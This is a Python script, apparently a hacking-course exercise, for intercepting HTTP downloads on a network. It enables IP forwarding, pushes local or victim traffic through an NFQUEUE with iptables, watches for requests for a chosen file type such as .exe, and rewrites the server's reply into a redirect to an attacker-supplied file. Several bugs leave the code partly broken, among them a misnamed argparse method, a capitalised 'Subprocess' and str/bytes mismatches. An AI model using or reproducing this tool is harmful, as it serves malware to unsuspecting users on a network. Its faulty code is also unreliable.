# !/usr/bin/env python

import os
import sys
import argparse
import subprocess
import netfilterqueue
import scapy.all as scapy

class Backup:
	def get_machine():
		return bool(input("Do you want to run this program on local machine(true/false): "))
	
	def get_path():
		return str(input("enter the path of the download file: "))
	
	def get_fileType():
		return str(input("type of file extension that need to be replaced: "))


def get_arguments():
	p = argparse.ArgumentParser(description='File Interceptor program in python')
	p.add_arguments('-l','--local', dest='local', help='Whether you want to run this on your local machine or not')
	p.add_arguments('-p','--path', dest='path', help='Path of the replaced file that is served')
	p.add_arguments('-qn','--queue-num', dest='queue_num', help='Queue number in IP tables that you want to capture the packtes into', default=0)
	p.add_arguments('-f', '--file', dest='fileType', help='type of file extension that need to be replaced')
	options = p.parse_args()
	if not options.local:
		options.local = Backup.get_machine()
	if not options.path:
		options.path = Backup.get_path()
	if not options.fileType:
		options.fileType = Backup.get_fileType()
	return options


arguments = get_arguments()

ack_list = [] #an empty list to store all the ack values from the response packets

def file_intercept(packet):
	sp = scapy.IP(packet.get_payload()) #conerting each packet inside the queue into a scapy packet
	if sp.haslayer(scapy.Raw): # checks for the Raw layer in the scapy packet
		if sp[scapy.TCP].dport == 80: #checking for the request packet
		#for now just print the statement that says this is request packet
			print("[+] HTTP REQUEST")
			#in the same manner we can do check for different type of files too
			if arguments.fileType in sp[scapy.Raw].load: #check for the .exe file download
				print("[+] Request to download .exe file")
				ack_list.append(sp[scapy.TCP].ack) #if there are any new requests then we add the ack value to the ack_list array
				
		elif sp[scapy.TCP].sport == 80: # check for response packet
			print("[+] HTTP RESPONSE")
			if sp[scapy.TCP].seq in ack_list: #check for the response seq number with the array of request ack values
				print("[+] Replacing the original file")
				# here we do the manipulation
				#once done with that particular request that particular value is no more needed
				ack_list.remove(sp[scapy.TCP].seq) #removes the given value from that list
				sp[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(arguments.path)
				del sp[scapy.TCP].chksum #delete the chksum value in the TCP layer
				del sp[scapy.IP].len #delete the len value in the IP layer
				del sp[scapy.IP].chksum #delete the chksum value in the IP layer
				#scapy can automatically calculate and add these parameters to the packet
				packet.set_payload(str(sp)) #sets the information inside the packet in queue to the scapy packet information that we modified till now

	packet.accept()


try:
	if sys.platform == 'win32' or sys.platform == 'cygwin':
		print("[+] Y R U STILL USING WINDOWS FOR THIS WORK [-]")
		print("[-] Quitting the program")
		sys.exit()
	elif sys.platform == 'linux':
		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	# run the iptables commad as per user input (local or victim machine)
	# these commands to to clear all the previous iptables that are created and left in case
	subprocess.call(['iptables','--flush'])
	Subprocess.call(['iptables','--table', 'nat', '--flush'])
	subprocess.call(['iptables','--delete-chain'])
	subprocess.call(['iptables','--table','nat','--delete-chain'])
	# check for the system to run the commands aganist
	if arguments.local:
		subprocess.call(['iptables','-I','INPUT','-j','NFQUEUE', '--queue-num', arguments.queue_num])
		subprocess.call(['iptables','-I','OUTPUT','-j','NFQUEUE', '--queue-num', arguments.queue_num])
	else:
		subprocess.call(['iptables','-P','FORWARD','ACCEPT'])
		subprocess.call(['iptables','-I','FORWARD','-j','NFQUEUE', '--queue-num', arguments.queue_num])
	queue0 = netfilterqueue.NetfilterQueue()
	queue0.bind(arguments.queue_num, file_intercept)
	print("\t\t\t[=] Made with code by DUMMY-the-BOT -- (use carefully)... <PEACE> [=]\n")
	print("[+] Starting file interceptor program")
	queue0.run()

except KeyboardInterrupt as error:
	print("\n\r[-] Detected Keyboard Interruption... quitting the program")
	print("[-] Deleting all the iptables created")
	os.system('iptables --flush')
	os.system('iptables --table nat -flush')
	os.system('iptables --delete-chain')
	os.system('iptables --table nat --delete-chain')
	print('[-] End of program usage')